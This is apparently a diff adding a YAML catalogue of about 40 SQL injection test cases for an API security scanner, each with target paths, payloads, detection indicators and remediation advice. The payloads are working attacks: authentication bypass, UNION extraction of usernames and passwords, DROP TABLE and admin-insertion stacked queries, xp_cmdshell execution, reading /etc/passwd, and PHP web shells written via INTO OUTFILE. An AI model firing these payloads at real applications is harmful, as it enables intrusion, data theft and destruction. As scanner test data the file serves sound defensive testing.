@@ -1,0 +1,1097 @@
+# SQLInjection - SQL Injection Test Cases
+# Reference: CWE-89, OWASP API4-2023, SQL Injection Cheat Sheet
+# Total: 50+ test cases covering MySQL, PostgreSQL, MSSQL, Oracle, SQLite
+
+api_version: "1.0"
+category: SQLInjection
+
+test_cases:
+
+  # === Authentication Bypass ===
+  - id: SQL-001
+    name: SQL Injection - Authentication Bypass (OR-based)
+    severity: CRITICAL
+    cwe_id: CWE-89
+    owasp_ref: API4-2023
+    description: Test OR-based SQL injection to bypass authentication
+    vuln_type: SQL_INJECTION
+    method: POST
+    path: /api/auth/login
+    parameters:
+      - name: username
+        type: string
+        location: body
+      - name: password
+        type: string
+        location: body
+    payloads:
+      - "' OR '1'='1"
+      - "' OR 'x'='x"
+      - "' OR 1=1--"
+      - "' OR 'a'='a"
+      - "admin'--"
+      - "admin' OR '1'='1"
+      - "' OR ''='"
+      - "1' OR '1'='1"
+    expected_response:
+      status_code: 200
+    validation:
+      type: auth_bypass
+      indicators:
+        - "token"
+        - "session"
+        - "jwt"
+        - "authenticated"
+      false_positive_patterns:
+        - "invalid credentials"
+        - "incorrect password"
+    remediation: |
+      Use parameterized queries (PreparedStatement).
+      Never concatenate user input into SQL strings.
+
+  - id: SQL-002
+    name: SQL Injection - Authentication Bypass (UNION-based)
+    severity: CRITICAL
+    cwe_id: CWE-89
+    description: Test UNION-based SQL injection for authentication bypass
+    vuln_type: SQL_INJECTION
+    method: POST
+    path: /api/login
+    parameters:
+      - name: email
+        type: string
+        location: body
+    payloads:
+      - "' UNION SELECT NULL--"
+      - "' UNION SELECT NULL,NULL--"
+      - "' UNION SELECT admin,pass FROM users--"
+      - "test' UNION SELECT 1,2,3--"
+    expected_response:
+      status_code: 200
+    validation:
+      type: union_injection
+      indicators:
+        - "admin"
+        - "password"
+        - "user data"
+    remediation: Use parameterized queries.
+
+  # === UNION-based Injection ===
+  - id: SQL-003
+    name: SQL Injection - UNION SELECT (MySQL)
+    severity: CRITICAL
+    cwe_id: CWE-89
+    description: Test UNION-based injection to extract MySQL data
+    vuln_type: SQL_INJECTION
+    method: GET
+    path: /api/search
+    parameters:
+      - name: q
+        type: string
+        location: query
+    payloads:
+      - "' UNION SELECT NULL--"
+      - "' UNION SELECT NULL,NULL,NULL--"
+      - "' UNION SELECT table_name,NULL FROM information_schema.tables--"
+      - "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--"
+      - "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL FROM dual--"
+    expected_response:
+      check_pattern: "information_schema|table_name|column_name"
+    validation:
+      type: union_injection
+      indicators:
+        - "information_schema"
+        - "table_name"
+        - "column_name"
+        - "users"
+    remediation: Use parameterized queries. Disable information_schema access.
+
+  - id: SQL-004
+    name: SQL Injection - UNION SELECT (PostgreSQL)
+    severity: CRITICAL
+    cwe_id: CWE-89
+    description: Test UNION-based injection for PostgreSQL
+    vuln_type: SQL_INJECTION
+    method: GET
+    path: /api/query
+    parameters:
+      - name: id
+        type: string
+        location: query
+    payloads:
+      - "1 UNION SELECT NULL--"
+      - "1 UNION SELECT version()--"
+      - "1 UNION SELECT table_name FROM information_schema.tables--"
+      - "1; DROP TABLE users--"
+      - "1' UNION SELECT pg_sleep(5)--"
+    expected_response:
+      check_pattern: "PostgreSQL|table_name"
+    validation:
+      type: postgresql_injection
+      indicators:
+        - "PostgreSQL"
+        - "pg_"
+        - "table_name"
+    remediation: Use parameterized queries. Enable pg_prepared_statements.
+
+  - id: SQL-005
+    name: SQL Injection - UNION SELECT (MSSQL)
+    severity: CRITICAL
+    cwe_id: CWE-89
+    description: Test UNION-based injection for Microsoft SQL Server
+    vuln_type: SQL_INJECTION
+    method: GET
+    path: /api/item
+    parameters:
+      - name: item_id
+        type: string
+        location: query
+    payloads:
+      - "1 UNION SELECT NULL--"
+      - "1 UNION SELECT @@version--"
+      - "1'; SELECT TOP 10 table_name FROM information_schema.tables--"
+      - "1'; EXEC xp_cmdshell 'whoami'--"
+      - "1'; WAITFOR DELAY '00:00:05'--"
+    expected_response:
+      check_pattern: "Microsoft SQL|@@version"
+    validation:
+      type: mssql_injection
+      indicators:
+        - "Microsoft SQL"
+        - "@@version"
+        - "column_1"
+    remediation: Use parameterized queries. Disable xp_cmdshell.
+
+  - id: SQL-006
+    name: SQL Injection - UNION SELECT (Oracle)
+    severity: CRITICAL
+    cwe_id: CWE-89
+    description: Test UNION-based injection for Oracle databases
+    vuln_type: SQL_INJECTION
+    method: GET
+    path: /api/product
+    parameters:
+      - name: pid
+        type: string
+        location: query
+    payloads:
+      - "' UNION SELECT NULL FROM DUAL--"
+      - "' UNION SELECT banner FROM v$version--"
+      - "' UNION SELECT table_name FROM all_tables--"
+      - "' UNION SELECT column_name FROM all_tab_columns WHERE table_name='USERS'--"
+    expected_response:
+      check_pattern: "Oracle|v$version|USERS"
+    validation:
+      type: oracle_injection
+      indicators:
+        - "Oracle"
+        - "v$version"
+        - "all_tables"
+    remediation: Use parameterized queries. Restrict access to data dictionary.
+
+  - id: SQL-007
+    name: SQL Injection - UNION SELECT (SQLite)
+    severity: CRITICAL
+    cwe_id: CWE-89
+    description: Test UNION-based injection for SQLite databases
+    vuln_type: SQL_INJECTION
+    method: GET
+    path: /api/data
+    parameters:
+      - name: id
+        type: string
+        location: query
+    payloads:
+      - "1 UNION SELECT NULL--"
+      - "1 UNION SELECT sqlite_version()--"
+      - "1 UNION SELECT name FROM sqlite_master WHERE type='table'--"
+      - "1'; ATTACH DATABASE '/tmp/pwned' AS pwned--"
+    expected_response:
+      check_pattern: "sqlite|table_name"
+    validation:
+      type: sqlite_injection
+      indicators:
+        - "sqlite"
+        - "table_name"
+        - "sqlite_master"
+    remediation: Use parameterized queries. Disable ATTACH DATABASE.
+
+  # === Boolean-based Blind Injection ===
+  - id: SQL-008
+    name: SQL Injection - Boolean-based Blind (True condition)
+    severity: HIGH
+    cwe_id: CWE-89
+    description: Test boolean-based blind SQL injection
+    vuln_type: SQL_INJECTION_BLIND
+    method: GET
+    path: /api/user
+    parameters:
+      - name: id
+        type: string
+        location: query
+    payloads:
+      - "1' AND 1=1--"
+      - "1' AND '1'='1"
+      - "1 AND 1=1"
+      - "1' AND ASCII(SUBSTRING((SELECT database()),1,1))>0--"
+    expected_response:
+      status_code: 200
+    validation:
+      type: blind_injection
+      indicators:
+        - status_code_difference: true
+        - response_time_difference: 0
+    remediation: Use parameterized queries. Implement WAF rules.
+
+  - id: SQL-009
+    name: SQL Injection - Boolean-based Blind (False condition)
+    severity: HIGH
+    cwe_id: CWE-89
+    description: Test boolean-based blind SQL injection with false condition
+    vuln_type: SQL_INJECTION_BLIND
+    method: GET
+    path: /api/user
+    parameters:
+      - name: id
+        type: string
+        location: query
+    payloads:
+      - "1' AND 1=2--"
+      - "1' AND '1'='2"
+      - "1 AND 1=2"
+      - "1' AND ASCII(SUBSTRING((SELECT database()),1,1))<0--"
+    expected_response:
+      status_code: 200
+    validation:
+      type: blind_injection
+      indicators:
+        - status_code_difference: false
+        - content_difference: true
+    remediation: Use parameterized queries.
+
+  # === Time-based Blind Injection ===
+  - id: SQL-010
+    name: SQL Injection - Time-based Blind (MySQL SLEEP)
+    severity: HIGH
+    cwe_id: CWE-89
+    description: Test time-based blind SQL injection using MySQL SLEEP
+    vuln_type: SQL_INJECTION_BLIND
+    method: GET
+    path: /api/search
+    parameters:
+      - name: q
+        type: string
+        location: query
+    payloads:
+      - "1' AND SLEEP(5)--"
+      - "1' AND SLEEP(5) AND '1'='1"
+      - "1; SELECT SLEEP(5)--"
+      - "1' AND (SELECT * FROM users) LIKE '%a%'"
+    expected_response:
+      status_code: 200
+    validation:
+      type: time_based
+      indicators:
+        - response_time_delay: 5
+      time_threshold: 4
+    remediation: Use parameterized queries. Set query timeout.
+
+  - id: SQL-011
+    name: SQL Injection - Time-based Blind (PostgreSQL pg_sleep)
+    severity: HIGH
+    cwe_id: CWE-89
+    description: Test time-based blind SQL injection using PostgreSQL pg_sleep
+    vuln_type: SQL_INJECTION_BLIND
+    method: GET
+    path: /api/query
+    parameters:
+      - name: id
+        type: string
+        location: query
+    payloads:
+      - "1' AND pg_sleep(5)--"
+      - "1; SELECT pg_sleep(5)--"
+      - "1' AND 1=1 AND pg_sleep(5)--"
+      - "1'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--"
+    expected_response:
+      status_code: 200
+    validation:
+      type: time_based
+      indicators:
+        - response_time_delay: 5
+      time_threshold: 4
+    remediation: Use parameterized queries. Disable pg_sleep in prepared statements.
+
+  - id: SQL-012
+    name: SQL Injection - Time-based Blind (MSSQL WAITFOR)
+    severity: HIGH
+    cwe_id: CWE-89
+    description: Test time-based blind SQL injection using MSSQL WAITFOR
+    vuln_type: SQL_INJECTION_BLIND
+    method: GET
+    path: /api/item
+    parameters:
+      - name: id
+        type: string
+        location: query
+    payloads:
+      - "1'; WAITFOR DELAY '00:00:05'--"
+      - "1' AND WAITFOR DELAY '00:00:05'--"
+      - "1'; IF(1=1) WAITFOR DELAY '00:00:05'--"
+      - "1'; BEGIN SELECT 1 END--"
+    expected_response:
+      status_code: 200
+    validation:
+      type: time_based
+      indicators:
+        - response_time_delay: 5
+      time_threshold: 4
+    remediation: Use parameterized queries. Set command timeout.
+
+  # === Error-based Injection ===
+  - id: SQL-013
+    name: SQL Injection - Error-based (MySQL)
+    severity: HIGH
+    cwe_id: CWE-89
+    description: Test error-based SQL injection to extract data via error messages
+    vuln_type: SQL_INJECTION
+    method: GET
+    path: /api/user
+    parameters:
+      - name: id
+        type: string
+        location: query
+    payloads:
+      - "1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--"
+      - "1' AND UPDATEXML(1,CONCAT(0x7e,user()),1)--"
+      - "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+      - "1' AND ELT(1=1,SLEEP(5))--"
+    expected_response:
+      status_code: 200
+    validation:
+      type: error_based
+      indicators:
+        - "XPATH"
+        - "syntax error"
+        - "mysql"
+        - "Duplicate entry"
+    remediation: Use parameterized queries. Disable detailed error messages in production.
+
+  - id: SQL-014
+    name: SQL Injection - Error-based (Oracle)
+    severity: HIGH
+    cwe_id: CWE-89
+    description: Test error-based SQL injection for Oracle
+    vuln_type: SQL_INJECTION
+    method: GET
+    path: /api/product
+    parameters:
+      - name: pid
+        type: string
+        location: query
+    payloads:
+      - "' AND CTXSYS.DRITHSX.SYNONYM-(1,user)--"
+      - "' AND (SELECT DBMS_UTILITY.VERSION FROM DUAL) IS NOT NULL--"
+      - "'; SELECT TO_NUMBER(SUBSTR(banner,1,instr(banner,' ')-1)) FROM v$version WHERE ROWNUM=1)--"
+    expected_response:
+      check_pattern: "Oracle|CTX|sys"
+    validation:
+      type: error_based
+      indicators:
+        - "ORA-"
+        - "Oracle error"
+        - "CTXSYS"
+    remediation: Use parameterized queries. Restrict CTXSYS privileges.
+
+  # === Stacked Queries ===
+  - id: SQL-015
+    name: SQL Injection - Stacked Queries (MySQL)
+    severity: CRITICAL
+    cwe_id: CWE-89
+    description: Test stacked queries for multiple statement execution
+    vuln_type: SQL_INJECTION
+    method: POST
+    path: /api/update
+    parameters:
+      - name: id
+        type: string
+        location: body
+    payloads:
+      - "1; DROP TABLE users--"
+      - "1; CREATE TABLE pwned(code TEXT)--"
+      - "1; INSERT INTO users(username,password) VALUES('hacker','pass')--"
+      - "1; UPDATE users SET role='admin' WHERE username='test'--"
+      - "1; SELECT * INTO OUTFILE '/tmp/dump.txt' FROM users--"
+    expected_response:
+      status_code: 200
+    validation:
+      type: stacked_queries
+      indicators:
+        - "table created"
+        - "table dropped"
+        - "data inserted"
+    remediation: Use parameterized queries. Disable multiple statements.
+
+  - id: SQL-016
+    name: SQL Injection - Stacked Queries (PostgreSQL)
+    severity: CRITICAL
+    cwe_id: CWE-89
+    description: Test stacked queries for PostgreSQL
+    vuln_type: SQL_INJECTION
+    method: POST
+    path: /api/delete
+    parameters:
+      - name: id
+        type: string
+        location: body
+    payloads:
+      - "1; DROP TABLE users CASCADE--"
+      - "1; CREATE TEMP TABLE pwned( данные TEXT);--"
+      - "1; COPY (SELECT * FROM users) TO '/tmp/dump.csv'--"
+      - "1; SELECT lo_export(1,'/tmp/shell.ora')--"
+    expected_response:
+      status_code: 200
+    validation:
+      type: stacked_queries
+      indicators:
+        - "table dropped"
+        - "COPY"
+    remediation: Use parameterized queries. Restrict file system access.
+
+  # === Second-order Injection ===
+  - id: SQL-017
+    name: SQL Injection - Second-order (Stored)
+    severity: CRITICAL
+    cwe_id: CWE-89
+    description: Test second-order SQL injection where payload is stored and executed later
+    vuln_type: SQL_INJECTION_SECOND_ORDER
+    method: POST
+    path: /api/register
+    parameters:
+      - name: username
+        type: string
+        location: body
+      - name: email
+        type: string
+        location: body
+    payloads:
+      - "admin'--"
+      - "user'); DROP TABLE users;--"
+      - "test' UNION SELECT * FROM users--"
+    expected_response:
+      status_code: 201
+    validation:
+      type: second_order
+      indicators:
+        - stored_indicator: "registration success"
+        - trigger_path: /api/profile
+      follow_up_requests:
+        - path: /api/profile
+          method: GET
+    remediation: Validate and sanitize all stored data before use.
+
+  # === JSON/Body Injection ===
+  - id: SQL-018
+    name: SQL Injection - JSON Body (MongoDB-style)
+    severity: HIGH
+    cwe_id: CWE-89
+    description: Test SQL injection in JSON request body
+    vuln_type: SQL_INJECTION
+    method: POST
+    path: /api/login
+    parameters:
+      - name: credentials
+        type: json
+        location: body
+    payloads:
+      - '{"username":"admin","password":"'' OR ''1''=''1"}'
+      - '{"$where":"1==1"}'
+      - '{"username":"admin","password":{"$ne":null}}'
+      - '{"username":"admin","password":{"$gt":""}}'
+    expected_response:
+      status_code: 200
+    validation:
+      type: json_injection
+      indicators:
+        - "token"
+        - "authenticated"
+    remediation: Use parameterized queries. Validate JSON schema.
+
+  - id: SQL-019
+    name: SQL Injection - XML Body
+    severity: HIGH
+    cwe_id: CWE-89
+    description: Test SQL injection in XML request body
+    vuln_type: SQL_INJECTION
+    method: POST
+    path: /api/search
+    parameters:
+      - name: xml_data
+        type: xml
+        location: body
+    payloads:
+      - "<?xml version=\"1.0\"?><search>1' OR '1'='1</search>"
+      - "<?xml version=\"1.0\"?><search><![CDATA[1' OR '1'='1']]></search>"
+      - "<?xml version=\"1.0\"?><search>1\" OR \"1\"=\"1</search>"
+    expected_response:
+      status_code: 200
+    validation:
+      type: xml_injection
+      indicators:
+        - "result"
+        - "data"
+    remediation: Use parameterized queries. Validate XML input.
+
+  # === Header/Cookie Injection ===
+  - id: SQL-020
+    name: SQL Injection - Cookie Value
+    severity: HIGH
+    cwe_id: CWE-89
+    description: Test SQL injection in cookie values
+    vuln_type: SQL_INJECTION
+    method: GET
+    path: /api/dashboard
+    cookies:
+      - name: session_id
+        payload: "' OR '1'='1"
+    payloads:
+      - "admin'--"
+      - "' UNION SELECT NULL--"
+    expected_response:
+      status_code: 200
+    validation:
+      type: cookie_injection
+      indicators:
+        - "authenticated"
+        - "admin"
+    remediation: Sanitize cookie values. Use parameterized queries.
+
+  - id: SQL-021
+    name: SQL Injection - User-Agent Header
+    severity: MEDIUM
+    cwe_id: CWE-89
+    description: Test SQL injection in User-Agent header
+    vuln_type: SQL_INJECTION
+    method: GET
+    path: /api/track
+    headers:
+      - name: User-Agent
+        payload: "' OR '1'='1"
+    expected_response:
+      status_code: 200
+    validation:
+      type: header_injection
+      indicators:
+        - "success"
+        - "logged"
+    remediation: Sanitize header values. Use parameterized queries for logging.
+
+  # === Parameter Pollution ===
+  - id: SQL-022
+    name: SQL Injection - Parameter Pollution
+    severity: HIGH
+    cwe_id: CWE-89
+    description: Test SQL injection via parameter pollution (HPP)
+    vuln_type: SQL_INJECTION
+    method: GET
+    path: /api/user
+    parameters:
+      - name: id
+        type: string
+        location: query
+        pollution: true
+    payloads:
+      - "1&id=2&id=3"
+      - "1&id=1' OR '1'='1"
+      - "1&id=1;DROP TABLE users--"
+    expected_response:
+      status_code: 200
+    validation:
+      type: parameter_pollution
+      indicators:
+        - multiple_results: true
+    remediation: Use parameterized queries. Validate first parameter only.
+
+  # === Database-specific Payloads ===
+  - id: SQL-023
+    name: SQL Injection - MySQL-specific (INTO OUTFILE)
+    severity: HIGH
+    cwe_id: CWE-89
+    description: Test MySQL-specific INTO OUTFILE injection
+    vuln_type: SQL_INJECTION
+    method: GET
+    path: /api/export
+    parameters:
+      - name: format
+        type: string
+        location: query
+    payloads:
+      - "' UNION SELECT '<?php system($_GET[\"cmd\"])?>' INTO OUTFILE '/var/www/html/shell.php'--"
+      - "' UNION SELECT '<?php eval($_POST[\"x\"])?>' INTO OUTFILE '/tmp/shell.php'--"
+      - "1' INTO OUTFILE '/var/www/html/backdoor.php' LINES TERMINATED BY '<?php phpinfo();?>'--"
+    expected_response:
+      check_pattern: "exported|success"
+    validation:
+      type: file_write
+      indicators:
+        - file_created: true
+    remediation: Use parameterized queries. Disable INTO OUTFILE.
+
+  - id: SQL-024
+    name: SQL Injection - PostgreSQL COPY
+    severity: CRITICAL
+    cwe_id: CWE-89
+    description: Test PostgreSQL COPY command injection
+    vuln_type: SQL_INJECTION
+    method: POST
+    path: /api/import
+    parameters:
+      - name: data
+        type: string
+        location: body
+    payloads:
+      - "1; COPY (SELECT * FROM users) TO '/tmp/dump.csv'--"
+      - "1; CREATE TABLE cmd_exec(cmd_output text);--"
+      - "1; COPY cmd_exec FROM '/etc/passwd'--"
+    expected_response:
+      status_code: 200
+    validation:
+      type: postgresql_copy
+      indicators:
+        - "COPY"
+        - "imported"
+    remediation: Use parameterized queries. Restrict COPY permissions.
+
+  # === Blind Injection via Response Differences ===
+  - id: SQL-025
+    name: SQL Injection - Blind via Response Length
+    severity: MEDIUM
+    cwe_id: CWE-89
+    description: Test blind SQL injection by observing response length differences
+    vuln_type: SQL_INJECTION_BLIND
+    method: GET
+    path: /api/post
+    parameters:
+      - name: id
+        type: string
+        location: query
+    payloads:
+      - "1' AND (SELECT LENGTH(database()))>0--"
+      - "1' AND (SELECT LENGTH(database()))>5--"
+      - "1' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--"
+    expected_response:
+      status_code: 200
+    validation:
+      type: blind_length
+      indicators:
+        - content_length_difference: true
+    remediation: Use parameterized queries.
+
+  - id: SQL-026
+    name: SQL Injection - Blind via Response Time
+    severity: MEDIUM
+    cwe_id: CWE-89
+    description: Test blind SQL injection using heavy queries
+    vuln_type: SQL_INJECTION_BLIND
+    method: GET
+    path: /api/search
+    parameters:
+      - name: q
+        type: string
+        location: query
+    payloads:
+      - "1' AND (SELECT COUNT(*) FROM users)>0 AND SLEEP(3) AND '1'='1"
+      - "1' AND (SELECT SUM(id) FROM (SELECT id FROM users LIMIT 100))>0 AND SLEEP(3)--"
+      - "1' OR (SELECT COUNT(*) FROM sys.objects) > 0 AND SLEEP(3)--"
+    expected_response:
+      status_code: 200
+    validation:
+      type: time_based
+      indicators:
+        - response_time_delay: 3
+      time_threshold: 2
+    remediation: Use parameterized queries. Set query timeout limits.
+
+  # === Numeric vs String Injection ===
+  - id: SQL-027
+    name: SQL Injection - Numeric Parameter (UNION)
+    severity: CRITICAL
+    cwe_id: CWE-89
+    description: Test SQL injection in numeric parameters using UNION
+    vuln_type: SQL_INJECTION
+    method: GET
+    path: /api/user
+    parameters:
+      - name: id
+        type: integer
+        location: query
+    payloads:
+      - "0 UNION SELECT NULL--"
+      - "0 UNION SELECT NULL,NULL,NULL--"
+      - "0 UNION SELECT username,password FROM users--"
+      - "-1 UNION SELECT 1,2,3,4,5--"
+    expected_response:
+      status_code: 200
+    validation:
+      type: union_injection
+      indicators:
+        - "username"
+        - "password"
+        - "email"
+    remediation: Use parameterized queries. Type-cast numeric inputs.
+
+  - id: SQL-028
+    name: SQL Injection - Numeric Parameter (Boolean)
+    severity: HIGH
+    cwe_id: CWE-89
+    description: Test boolean-based SQL injection in numeric parameters
+    vuln_type: SQL_INJECTION_BLIND
+    method: GET
+    path: /api/product
+    parameters:
+      - name: price
+        type: number
+        location: query
+    payloads:
+      - "1 OR 1=1"
+      - "1 AND 1=1"
+      - "1 AND 1=2"
+      - "1' OR '1'='1"
+    expected_response:
+      status_code: 200
+    validation:
+      type: numeric_boolean
+      indicators:
+        - response_difference: true
+    remediation: Use parameterized queries. Validate numeric ranges.
+
+  # === LIKE/WILDCARD Injection ===
+  - id: SQL-029
+    name: SQL Injection - LIKE Wildcard
+    severity: HIGH
+    cwe_id: CWE-89
+    description: Test SQL injection in LIKE clause using wildcards
+    vuln_type: SQL_INJECTION
+    method: GET
+    path: /api/search
+    parameters:
+      - name: query
+        type: string
+        location: query
+    payloads:
+      - "%' OR '1'='1"
+      - "' OR '%'='"
+      - "admin'--"
+      - "' UNION SELECT NULL,NULL,NULL--"
+      - "' AND 1=1--"
+    expected_response:
+      status_code: 200
+    validation:
+      type: like_injection
+      indicators:
+        - all_records_returned: true
+    remediation: Escape LIKE wildcards. Use parameterized queries.
+
+  # === ORM-specific Injection ===
+  - id: SQL-030
+    name: SQL Injection - Hibernate Query Language (HQL)
+    severity: CRITICAL
+    cwe_id: CWE-89
+    description: Test HQL injection in Hibernate-based applications
+    vuln_type: SQL_INJECTION_HQL
+    method: GET
+    path: /api/search
+    parameters:
+      - name: name
+        type: string
+        location: query
+    payloads:
+      - "admin' OR '1'='1"
+      - "1'; FROM User;--"
+      - "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM User--"
+      - "1) OR 1=1--"
+    expected_response:
+      status_code: 200
+    validation:
+      type: hql_injection
+      indicators:
+        - "User"
+        - "role"
+    remediation: Use Hibernate Criteria API. Avoid dynamic queries.
+
+  # === Laravel-specific Injection ===
+  - id: SQL-031
+    name: SQL Injection - Laravel Query Builder
+    severity: CRITICAL
+    cwe_id: CWE-89
+    description: Test SQL injection in Laravel query builder
+    vuln_type: SQL_INJECTION
+    method: GET
+    path: /api/users
+    parameters:
+      - name: search
+        type: string
+        location: query
+    payloads:
+      - "' OR 1=1--"
+      - "1' AND SLEEP(3)--"
+      - "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM users--"
+      - "1; DROP TABLE users--"
+    expected_response:
+      status_code: 200
+    validation:
+      type: laravel_injection
+      indicators:
+        - all_records_returned: true
+    remediation: Use Eloquent ORM. Avoid raw queries with user input.
+
+  # === Django-specific Injection ===
+  - id: SQL-032
+    name: SQL Injection - Django ORM extra()
+    severity: CRITICAL
+    cwe_id: CWE-89
+    description: Test SQL injection in Django ORM extra() method
+    vuln_type: SQL_INJECTION
+    method: GET
+    path: /api/items
+    parameters:
+      - name: filter
+        type: string
+        location: query
+    payloads:
+      - "1) OR 1=1--"
+      - "'); DROP TABLE users;--"
+      - "1) UNION SELECT NULL,NULL,NULL,NULL FROM auth_user--"
+    expected_response:
+      status_code: 200
+    validation:
+      type: django_injection
+      indicators:
+        - "auth_user"
+    remediation: Use Django ORM methods. Avoid extra() with user input.
+
+  # === Batch/Transaction Testing ===
+  - id: SQL-033
+    name: SQL Injection - Transaction Rollback
+    severity: MEDIUM
+    cwe_id: CWE-89
+    description: Test if SQL injection can be prevented by transaction rollback
+    vuln_type: SQL_INJECTION
+    method: POST
+    path: /api/transfer
+    parameters:
+      - name: from
+        type: string
+        location: body
+      - name: to
+        type: string
+        location: body
+      - name: amount
+        type: number
+        location: body
+    payloads:
+      - "'; ROLLBACK;--"
+      - "1'; COMMIT;--"
+      - "' AND '1'='1"
+    expected_response:
+      status_code: 200
+    validation:
+      type: transaction_test
+      indicators:
+        - transaction_protected: false
+    remediation: Use parameterized queries within transactions.
+
+  # === Encoded Payloads ===
+  - id: SQL-034
+    name: SQL Injection - URL Encoding Bypass
+    severity: HIGH
+    cwe_id: CWE-89
+    description: Test SQL injection with URL encoding to bypass filters
+    vuln_type: SQL_INJECTION
+    method: GET
+    path: /api/user
+    parameters:
+      - name: id
+        type: string
+        location: query
+    payloads:
+      - "1%27%20OR%20%271%27%3D%271"
+      - "%27%20OR%20%271%27%3D%271"
+      - "1%22%20OR%20%221%22%3D%222"
+      - "1%29%20OR%20%281%29%3D%281"
+    expected_response:
+      status_code: 200
+    validation:
+      type: encoded_bypass
+      indicators:
+        - bypass_successful: true
+    remediation: Decode and validate all input. Use WAF.
+
+  - id: SQL-035
+    name: SQL Injection - Double URL Encoding
+    severity: HIGH
+    cwe_id: CWE-89
+    description: Test SQL injection with double URL encoding
+    vuln_type: SQL_INJECTION
+    method: GET
+    path: /api/user
+    parameters:
+      - name: id
+        type: string
+        location: query
+    payloads:
+      - "1%2527%2520OR%25201%253D%253D1"
+      - "%2527%2520OR%2520%25271%2527%253D%25271"
+    expected_response:
+      status_code: 200
+    validation:
+      type: double_encoding_bypass
+      indicators:
+        - bypass_successful: true
+    remediation: Decode multiple times and validate.
+
+  # === Case Variation ===
+  - id: SQL-036
+    name: SQL Injection - Case Variation (SQL keywords)
+    severity: HIGH
+    cwe_id: CWE-89
+    description: Test SQL injection with case variations to bypass filters
+    vuln_type: SQL_INJECTION
+    method: GET
+    path: /api/search
+    parameters:
+      - name: q
+        type: string
+        location: query
+    payloads:
+      - "UniOn SeLeCt 1,2,3--"
+      - "uNiOn ALL SeLeCt NULL--"
+      - "Or 1=1--"
+      - "AnD 1=1--"
+    expected_response:
+      status_code: 200
+    validation:
+      type: case_variation_bypass
+      indicators:
+        - bypass_successful: true
+    remediation: Normalize case before validation. Use parameterized queries.
+
+  # === Comment Injection ===
+  - id: SQL-037
+    name: SQL Injection - Comment Termination
+    severity: HIGH
+    cwe_id: CWE-89
+    description: Test SQL injection using SQL comments to terminate queries
+    vuln_type: SQL_INJECTION
+    method: GET
+    path: /api/item
+    parameters:
+      - name: id
+        type: string
+        location: query
+    payloads:
+      - "1'--"
+      - "1'#"
+      - "1'/*"
+      - "1' OR '1'='1'--"
+      - "1' OR '1'='1'#"
+    expected_response:
+      status_code: 200
+    validation:
+      type: comment_termination
+      indicators:
+        - bypass_successful: true
+    remediation: Sanitize comment characters. Use parameterized queries.
+
+  # === Logic Chaining ===
+  - id: SQL-038
+    name: SQL Injection - Logic Chaining (AND/OR)
+    severity: HIGH
+    cwe_id: CWE-89
+    description: Test SQL injection with complex logic chaining
+    vuln_type: SQL_INJECTION
+    method: GET
+    path: /api/filter
+    parameters:
+      - name: category
+        type: string
+        location: query
+    payloads:
+      - "a' AND 1=1 AND 'a'='a"
+      - "a' OR 1=1 AND 'a'='a"
+      - "' OR 1=1 AND id IN (SELECT id FROM users)--"
+    expected_response:
+      status_code: 200
+    validation:
+      type: logic_chaining
+      indicators:
+        - all_records_returned: true
+    remediation: Use parameterized queries. Validate logic operators.
+
+  # === Subquery Injection ===
+  - id: SQL-039
+    name: SQL Injection - Subquery Injection
+    severity: HIGH
+    cwe_id: CWE-89
+    description: Test SQL injection using subqueries
+    vuln_type: SQL_INJECTION
+    method: GET
+    path: /api/report
+    parameters:
+      - name: id
+        type: string
+        location: query
+    payloads:
+      - "1' AND (SELECT COUNT(*) FROM users)>0--"
+      - "1' AND (SELECT MAX(id) FROM users)='1'"
+      - "1' OR (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--"
+    expected_response:
+      status_code: 200
+    validation:
+      type: subquery_injection
+      indicators:
+        - subquery_executed: true
+    remediation: Use parameterized queries. Restrict subquery capabilities.
+
+  # === Full Coverage Summary ===
+  - id: SQL-040
+    name: SQL Injection - Full Coverage Summary
+    severity: CRITICAL
+    cwe_id: CWE-89
+    description: Comprehensive SQL injection test covering all vectors
+    vuln_type: SQL_INJECTION
+    method: POST
+    path: /api/submit
+    parameters:
+      - name: data
+        type: string
+        location: body
+    attack_vectors:
+      - name: authentication_bypass
+        payloads:
+          - "' OR '1'='1"
+          - "admin'--"
+      - name: union_attack
+        payloads:
+          - "' UNION SELECT NULL,NULL,NULL,NULL,NULL FROM users--"
+      - name: stacked_queries
+        payloads:
+          - "1; DROP TABLE users--"
+      - name: boolean_blind
+        payloads:
+          - "1' AND 1=1--"
+      - name: time_based
+        payloads:
+          - "1' AND SLEEP(5)--"
+      - name: error_based
+        payloads:
+          - "1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--"
+    expected_response:
+      status_code: 200
+    validation:
+      type: comprehensive
+      indicators:
+        - authentication_bypass: true
+        - data_extraction: true
+        - command_execution: false
+    remediation: Use parameterized queries exclusively. Implement defense in depth.
